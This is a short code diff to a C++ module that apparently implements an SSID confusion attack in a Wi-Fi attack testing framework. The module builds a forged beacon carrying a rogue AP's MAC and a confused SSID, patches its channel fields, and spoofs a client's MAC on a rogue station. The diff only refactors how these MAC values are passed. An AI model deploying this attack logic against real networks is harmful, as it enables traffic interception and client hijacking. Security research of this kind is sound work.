@@ -15,19 +15,17 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 	rogue_ap->set_iface_up();
     rogue_sta->set_iface_up();
 
-	// have to be same as ap  (At least EAP-pwd, every what need AP mac)
-    const HWAddress<6> rogue_ap_mac(rogue_ap.get(SK::mac));
-    const HWAddress<6> client_perm(sta.get(SK::permanent_mac));
-
 	const auto &att_cfg = rs.config().at("attack_config");
 	// scan for real AP beacon on real channel
 	setup_real_AP_RSN_frames(att_cfg.at("beacon_timeout_sec"));
 
     // rogue_ap_mac BSSID + SafeNet SSID, ch IEs patched to rogue channel
     // rogue_ap_mac avoids wpa_supplicant's 10s ignore-list that fires after CSA disconnect
-    auto confused_beacon = make_confused_beacon(*beacon, confused_ssid); //TODO should be strip_pmkid_in_assoc here?
-    confused_beacon->addr2(rogue_ap_mac);
-    confused_beacon->addr3(rogue_ap_mac);
+    auto confused_beacon = make_confused_beacon(*beacon, confused_ssid);
+	// same as rogue_ap
+    confused_beacon->addr2(rogue_ap.get(SK::mac));
+    confused_beacon->addr3(rogue_ap.get(SK::mac));
+
     if(auto *ch_ie = confused_beacon->search_option(Dot11ManagementFrame::DS_SET))
         const_cast<uint8_t *>(ch_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
     if(auto *ht_ie = confused_beacon->search_option(Dot11ManagementFrame::HT_OPERATION)) {
@@ -52,7 +50,7 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 
 	const string nic_client_ack = "client_ack_vif";
 	rogue_sta->set_mac_address(sta->get(SK::mac));
-	start_ap_hostapd(rs, nic_client_ack, rogue_sta, netconfig.real_channel, client_perm);
+	start_ap_hostapd(rs, nic_client_ack, rogue_sta, netconfig.real_channel, sta.get(SK::permanent_mac));
 
     rs.start_observers(ObserverRunPolicy::SKIP);
     rs.process_manager.write_log_all(ATTACK_START_tag);
